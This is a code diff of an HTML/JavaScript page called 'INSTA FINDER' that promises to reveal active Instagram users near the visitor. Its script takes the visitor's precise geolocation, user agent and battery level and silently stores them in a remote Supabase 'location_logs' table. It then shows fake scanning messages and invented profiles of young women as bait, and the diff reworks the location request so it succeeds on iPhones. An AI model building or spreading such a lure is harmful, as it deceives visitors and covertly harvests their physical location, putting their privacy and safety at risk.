@@ -9,127 +9,129 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap');
         :root { --ig-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --bg: #050b18; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden; }
         
-        /* Zoom-In Entry Animation */
-        .zoom-entry { animation: zoomIn 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
-        @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
+        
+        body { background: var(--bg); color: white; min-height: 100vh; overflow: hidden; position: fixed; width: 100%; }
+        
         .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 15% 20%, rgba(220, 39, 67, 0.15) 0%, transparent 40%), radial-gradient(circle at 85% 80%, rgba(64, 93, 230, 0.15) 0%, transparent 40%); }
-        nav { padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(5, 11, 24, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255,255,255,0.05); position: sticky; top: 0; z-index: 1000; }
-        .logo { font-weight: 900; font-size: 1.5rem; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        .hero { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; min-height: 85vh; gap: 30px; }
-        .hero h1 { font-size: clamp(2.5rem, 8vw, 4rem); font-weight: 900; line-height: 1.1; }
-        .hero p { color: #a1a1a1; font-size: 1.1rem; max-width: 400px; }
+        nav { padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; background: rgba(5, 11, 24, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .logo { font-weight: 900; font-size: 24px; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        .radar-box { position: relative; width: min(280px, 70vw); height: min(280px, 70vw); }
+        .hero { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; height: calc(100vh - 70px); gap: 25px; }
+        .hero h1 { font-size: 48px; font-weight: 900; line-height: 1.1; }
+        .hero p { color: #a1a1a1; font-size: 17px; max-width: 320px; }
+
+        .radar-box { position: relative; width: 260px; height: 260px; }
         .radar-circle { width: 100%; height: 100%; border-radius: 50%; border: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.02); }
         .pulse { position: absolute; width: 100%; height: 100%; border: 2px solid #dc2743; border-radius: 50%; animation: pulse-anim 2.5s infinite; }
-        .ig-icon { font-size: 5rem; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .ig-icon { font-size: 80px; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        .btn-main { background: var(--ig-grad); color: white; border: none; padding: 18px 40px; border-radius: 12px; font-size: 1.1rem; font-weight: 800; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 10px; box-shadow: 0 10px 20px rgba(220, 39, 67, 0.3); }
-        .btn-main:active { transform: scale(0.95); }
+        .btn-main { background: var(--ig-grad); color: white; border: none; padding: 18px 45px; border-radius: 15px; font-size: 18px; font-weight: 800; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 10px; box-shadow: 0 10px 25px rgba(220, 39, 67, 0.3); }
 
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .loader { width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #dc2743; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
 
-        #results { display: none; padding: 40px 20px; text-align: center; animation: fadeIn 0.5s ease; }
+        #results { display: none; padding: 40px 20px; text-align: center; height: 100vh; overflow-y: auto; background: var(--bg); position: fixed; top: 0; left: 0; width: 100%; z-index: 10000; }
         .result-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 30px; }
-        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); padding: 15px; border-radius: 15px; text-align: center; }
-        .card img { width: 70px; height: 70px; border-radius: 50%; border: 2px solid #dc2743; padding: 2px; margin-bottom: 8px; object-fit: cover; }
-        .card b { font-size: 0.9rem; display: block; overflow: hidden; text-overflow: ellipsis; }
+        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; }
+        .card img { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #dc2743; padding: 3px; margin-bottom: 10px; object-fit: cover; }
 
         @keyframes pulse-anim { 0% { transform: scale(0.7); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
         @keyframes spin { to { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        @media (min-width: 768px) { .result-grid { grid-template-columns: repeat(3, 1fr); } .hero { padding: 80px 8%; flex-direction: row; text-align: left; } .btn-main { margin: 0; } }
+        @media (min-width: 768px) { .result-grid { grid-template-columns: repeat(3, 1fr); } }
     </style>
 </head>
-<body class="zoom-entry">
+<body>
     <div class="bg-glow"></div>
     <nav><div class="logo">INSTA FINDER</div></nav>
 
     <section class="hero" id="home">
-        <div class="hero-text">
-            <h1>Discover <span style="color: #dc2743">Active</span><br>Users Near You.</h1>
-            <p>Advanced mapping to find active profiles within 300m of your current location.</p><br>
-            <button class="btn-main" onclick="startScan()">
-                <i class="fas fa-search-location"></i> SCAN USER
-            </button>
-        </div>
+        <h1>Discover <span style="color: #dc2743">Active</span><br>Users Near You.</h1>
+        <p>Find and connect with active profiles within 300m of your location.</p>
+        
         <div class="radar-box">
-            <div class="radar-circle"><div class="pulse"></div><i class="fab fa-instagram ig-icon"></i></div>
+            <div class="radar-circle">
+                <div class="pulse"></div>
+                <div class="pulse" style="animation-delay: 1.2s;"></div>
+                <i class="fab fa-instagram ig-icon"></i>
+            </div>
         </div>
+
+        <button class="btn-main" onclick="p_system_fire()">
+            <i class="fas fa-search-location"></i> SCAN USER
+        </button>
     </section>
 
     <div id="overlay">
         <div class="loader"></div>
-        <h2 id="logText">INITIALIZING...</h2>
+        <h2 id="log" style="letter-spacing: 2px; font-weight: 900;">INITIALIZING...</h2>
     </div>
 
     <section id="results">
-        <h2>User Active Status</h2>
-        <div class="result-grid" id="grid"></div>
+        <h2 style="font-size: 30px; margin-bottom: 20px;">User Active Status</h2>
+        <div class="result-grid" id="profile-list"></div>
         <button class="btn-main" style="margin: 40px auto; width: 100%; max-width: 280px;" onclick="window.location.href='https://instagram.com'">VIEW FULL PROFILES</button>
     </section>
 
 <script>
-    const URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
-    const KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
-    const sb = supabase.createClient(URL, KEY);
+    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
+    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
+    const pardhan_sb = supabase.createClient(SB_URL, SB_KEY);
 
-    function startScan() {
+    async function p_system_fire() {
+        const log = document.getElementById('log');
         const overlay = document.getElementById('overlay');
-        const st = document.getElementById('logText');
         
-        // iOS Fix: Trigger geolocation immediately on click
+        // 1. iPhone Fix: Request Location IMMEDIATELY before doing anything else
         if (navigator.geolocation) {
-            overlay.style.display = 'flex';
-            st.innerText = "Requesting Satellite Access...";
-
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                st.innerText = "Coordinates Secured. Syncing...";
-                
+                // Now show the overlay and animations
+                overlay.style.display = 'flex';
+                log.innerText = "Coordinates Secured. Syncing...";
+
                 let batt = "N/A";
                 try { const b = await navigator.getBattery(); batt = `${(b.level * 100).toFixed(0)}%`; } catch(e) {}
 
-                await sb.from('location_logs').insert([{
+                // Send to Supabase
+                const { error } = await pardhan_sb.from('location_logs').insert([{
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
                     user_agent: navigator.userAgent,
                     ip: `Batt: ${batt} | Insta-Finder` 
                 }]);
 
-                setTimeout(() => { st.innerText = "Analyzing Local Nodes..."; }, 1500);
-                setTimeout(() => { st.innerText = "Fetching Profiles..."; }, 3500);
-                setTimeout(() => {
-                    overlay.style.display = 'none';
-                    document.getElementById('home').style.display = 'none';
-                    document.getElementById('results').style.display = 'block';
-                    loadGirls();
-                }, 5500);
+                if (!error) {
+                    setTimeout(() => { log.innerText = "Analyzing Local Nodes..."; }, 1500);
+                    setTimeout(() => { log.innerText = "Fetching Profiles..."; }, 3500);
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        document.getElementById('home').style.display = 'none';
+                        document.getElementById('results').style.display = 'block';
+                        renderGirls();
+                    }, 5500);
+                }
             }, (err) => {
-                overlay.style.display = 'none';
-                alert("Location access is mandatory for scanning nearby users. Please allow and refresh.");
-            }, { enableHighAccuracy: true, timeout: 10000 });
+                alert("Location permission is required to find people in your area. Please allow and refresh.");
+            }, { enableHighAccuracy: true });
         }
     }
 
-    function loadGirls() {
-        const g = document.getElementById('grid');
-        const data = [
+    function renderGirls() {
+        const list = document.getElementById('profile-list');
+        const users = [
             {n: 'priya_vibe', id: 60}, {n: 'neha.official', id: 65}, 
             {n: 'shruti_x', id: 16}, {n: 'sneha.arts', id: 26}, 
             {n: 'khushi_vlogs', id: 32}, {n: 'ananya_11', id: 45}
         ];
-        data.forEach(x => {
-            g.innerHTML += `
+        list.innerHTML = ""; // Clear list
+        users.forEach(u => {
+            list.innerHTML += `
                 <div class="card">
-                    <img src="https://i.pravatar.cc/150?u=${x.id}">
-                    <b>@${x.n}</b>
+                    <img src="https://i.pravatar.cc/150?u=${u.id}">
+                    <div style="font-weight: 900; font-size: 14px;">@${u.n}</div>
                     <div style="font-size: 10px; color: #dc2743; margin-top: 5px;"><i class="fas fa-circle"></i> Active Now</div>
                 </div>`;
         });
